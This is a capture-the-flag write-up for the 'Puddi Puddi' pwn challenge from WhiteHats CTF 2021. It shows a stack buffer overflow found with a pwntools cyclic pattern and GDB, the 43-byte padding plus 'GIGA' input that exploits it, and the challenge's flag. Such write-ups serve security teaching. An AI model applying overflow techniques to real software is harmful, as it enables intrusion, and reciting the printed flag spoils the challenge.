---
layout: writeup
ctf: WhiteHats CTF 2021
chal: Puddi Puddi
category: pwn
flag: WH2021{3880fba0faf0_g1g4_pudd1}
points: 981
solves: 12
---

> Why have a MEGA 🍮 when you can have a GIGA 🍮?

Files given:
 - [puddi](puddi)

## Challenge

We see that it moves the string `MEGA` to `rbp-0x5` and then after receiving a user input, checks if `rbp-0x5` is GIGA. This is simply asking for buffer overflow!

Instead of staring at the binary, we can overflow it wih pwntools `cyclic(100)` and then use GDB and break at strcmp to check what the value of `rbp-0x5` is, and with this compute the padding needed.

```
strcmp@plt (
   $rdi = 0x00007fffffffe6cb → "alaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaax[...]",
   $rsi = 0x0000555555400da8 → 0x706f4f0041474947 ("GIGA"?),
   $rdx = 0x0000000000000000
)
```

```py
>>> cyclic_find("alaa")
43
```

Hence we simply send in `pattern(43)+"GIGA"` as input to get the flag:

```
Do you like pudding? (Y/N) => aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaGIGA
PUDDI PUDDI!
PUDDI PUDDI!
SUGOKU DEKKAI...

 .d8888b.  8888888  .d8888b.         d8888       8888888b.  888     888 8888888b.  8888888b. 8888888 888
d88P  Y88b   888   d88P  Y88b       d88888       888   Y88b 888     888 888  "Y88b 888  "Y88b  888   888
888    888   888   888    888      d88P888       888    888 888     888 888    888 888    888  888   888
888          888   888            d88P 888       888   d88P 888     888 888    888 888    888  888   888
888  88888   888   888  88888    d88P  888       8888888P"  888     888 888    888 888    888  888   888
888    888   888   888    888   d88P   888       888        888     888 888    888 888    888  888   Y8P
Y88b  d88P   888   Y88b  d88P  d8888888888       888        Y88b. .d88P 888  .d88P 888  .d88P  888    "
 "Y8888P88 8888888  "Y8888P88 d88P     888       888         "Y88888P"  8888888P"  8888888P" 8888888 888


WH2021{3880fba0faf0_g1g4_pudd1}
```
